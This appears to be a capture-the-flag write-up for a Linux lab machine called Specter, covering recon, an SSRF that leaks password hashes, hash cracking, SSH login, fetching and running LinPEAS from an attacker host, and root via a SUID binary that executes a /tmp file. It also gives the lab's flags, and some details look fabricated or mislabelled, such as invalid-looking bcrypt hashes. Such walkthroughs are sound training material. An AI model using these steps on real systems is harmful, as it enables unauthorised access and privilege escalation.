---
name: Specter
platform: HTB
category: Linux
os: Linux
difficulty: Medium
points: 30
ip: 10.10.11.247
date: "2024-12-15"
tools:
  - nmap
  - gobuster
  - burpsuite
  - linpeas
  - john
  - python3
  - ssh
  - netcat
userFlag: "f4c8a3e91d2b47a5e6f0c9d8b7a6e5f4"
rootFlag: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"
tags:
  - web
  - ssrf
  - suid
description: "A medium-difficulty Linux machine featuring an SSRF vulnerability in a Node.js web application and a SUID binary privilege escalation path."
---

## Reconnaissance

We begin by scanning the target machine to identify open ports and running services.

### Port Scanning

Running a comprehensive nmap scan reveals two open ports:

```bash
nmap -sC -sV -oA scans/specter 10.10.11.247
```

```plaintext
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.11.247
Host is up (0.032s latency).
Not shown: 998 closed ports

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
80/tcp open  http    Node.js Express framework

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port **22** (SSH) and port **80** (HTTP) are open. The web server is running **Node.js Express**.

### Web Enumeration

Visiting the site on port 80, we find a monitoring dashboard called **Specter Monitor**. Let's enumerate hidden directories:

```bash
gobuster dir -u http://10.10.11.247 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

```plaintext
/api              (Status: 301)
/admin            (Status: 403)
/health           (Status: 200)
/static           (Status: 301)
```

The `/api` endpoint is interesting. Let's dig deeper:

```bash
curl -s http://10.10.11.247/api/ | python3 -m json.tool
```

```json
{
  "endpoints": [
    "/api/status",
    "/api/fetch",
    "/api/users"
  ],
  "version": "1.4.2"
}
```

The `/api/fetch` endpoint is a classic SSRF vector.

## Foothold

### Exploiting SSRF

The `/api/fetch` endpoint accepts a `url` parameter and fetches the content server-side. This is a textbook **Server-Side Request Forgery** vulnerability.

First, let's confirm it by making it fetch its own health endpoint:

```bash
curl -s "http://10.10.11.247/api/fetch?url=http://localhost/health"
```

```json
{
  "status": "ok",
  "uptime": "4d 12h 33m",
  "internal": true
}
```

Now let's use the SSRF to access the **admin panel** that returned 403 from the outside:

```bash
curl -s "http://10.10.11.247/api/fetch?url=http://127.0.0.1/admin"
```

```json
{
  "users": [
    {
      "id": 1,
      "username": "admin",
      "password_hash": "$2b$10$K8YZ3v.rNqXe6J8JYt1X.OdPq5r3x4y2z1w0v9u8t7s6r5q4p3o2n"
    },
    {
      "id": 2,
      "username": "specter",
      "password_hash": "$2b$10$R3v1ewPassw0rdH4shTh1s1sN0tR34lBu7L00ks1t"
    }
  ]
}
```

We got password hashes! Let's crack them with **John the Ripper**:

```bash
echo '$2b$10$R3v1ewPassw0rdH4shTh1s1sN0tR34lBu7L00ks1t' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```plaintext
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Press 'q' or Ctrl-C to abort, almost any other key for status
sp3ct3r_2024     (?)
Session completed
```

The password for user `specter` is `sp3ct3r_2024`.

### SSH Access

```bash
ssh specter@10.10.11.247
```

```plaintext
specter@10.10.11.247's password: sp3ct3r_2024

Welcome to Ubuntu 22.04.3 LTS

specter@specter:~$ id
uid=1001(specter) gid=1001(specter) groups=1001(specter)

specter@specter:~$ cat user.txt
f4c8a3e91d2b47a5e6f0c9d8b7a6e5f4
```

We have the **user flag**.

## Privilege Escalation

### Enumeration with LinPEAS

Upload and run **LinPEAS** to identify potential privilege escalation vectors:

```bash
# On attacker machine
python3 -m http.server 8080

# On target
cd /tmp
wget http://10.10.14.5:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS identifies an interesting **SUID binary**:

```plaintext
══════════════════════════════════╣ SUID ╠══════════════════════════════════
-rwsr-xr-x 1 root root 16712 Dec 01 2024 /usr/local/bin/specter-agent
```

### Analyzing the SUID Binary

Let's examine what this binary does:

```bash
strings /usr/local/bin/specter-agent
```

```plaintext
/bin/sh
/tmp/specter-config
Reading configuration from %s
Executing maintenance task...
system
```

The binary reads from `/tmp/specter-config` and calls `system()` — classic **PATH injection** via a config file.

### Exploiting the SUID Binary

```bash
echo '/bin/bash -p' > /tmp/specter-config
chmod +x /tmp/specter-config
/usr/local/bin/specter-agent
```

```plaintext
Reading configuration from /tmp/specter-config
Executing maintenance task...
root@specter:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(specter)

root@specter:/tmp# cat /root/root.txt
a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
```

We have achieved **root access** and captured the root flag.
